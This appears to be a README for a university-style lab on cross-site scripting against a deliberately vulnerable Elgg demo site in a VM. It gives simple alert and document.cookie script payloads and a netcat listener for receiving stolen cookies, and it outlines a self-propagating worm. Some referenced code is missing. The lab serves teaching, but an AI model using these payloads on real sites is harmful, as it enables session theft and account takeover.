## Cross-Site-Scripting-XSS-Attack

# Goal

To design scrips for the following attack on a demo website ::

- Becoming the Victim’s Friend
- Modifying the Victims Profile
- Posting on the Wire on Behalf of the Victim 
- Design a Self-Propagating Worm 

# Overview 
Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability makes it possible for attackers to inject malicious code (e.g. JavaScript programs) into victim’s web browser. Using this malicious code, attackers can steal a victim’s credentials, such as session cookies. The access control policies (i.e., the same origin policy) employed by browsers to protect those credentials can be bypassed by exploiting XSS vulnerabilities.

To demonstrate what attackers can do by exploiting XSS vulnerabilities, we will use a web application named Elgg provided in our pre-built Ubuntu VM image. In this assignment, students need to exploit this vulnerability to launch an XSS attack on the modified Elgg. This assignment covers the following topics:

• Cross-Site Scripting attack
• XSS worm and self-propagation 
• Session cookies
• HTTP GET and POST requests
• JavaScript and Ajax

# Setting up Environment

- Login to Seed Ubuntu and start the apache server.
$sudo service apache2 start
- Vulnerable website and its source code location.
 URL: http://www.xsslabelgg.com Folder: /var/www/XSS/Elgg/
 
 
 # Getting Started
First embed a JavaScript program in your Elgg profile, such that when another user views your profile, the JavaScript program will be executed and an alert window will be displayed. The following JavaScript program will display an alert window:
<script>alert(‘XSS’);</script>
Similarly, your cookie can be viewed
<script>alert(document.cookie);</script>
If your input string is greater than the input field you can use the following trick
The above malicious JavaScript code written by the attacker can print out the user’s cookies, but only the user can see the cookies, not the attacker. Suppose, the attacker wants the JavaScript code to send the cookies to himself/herself. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.
The JavaScript given below sends the cookies to the port 5555 of the attacker’s machine, where the attacker has a TCP server listening to the same port.
Listen to the port with Netcat with the following command
$ nc -l 5555 -v





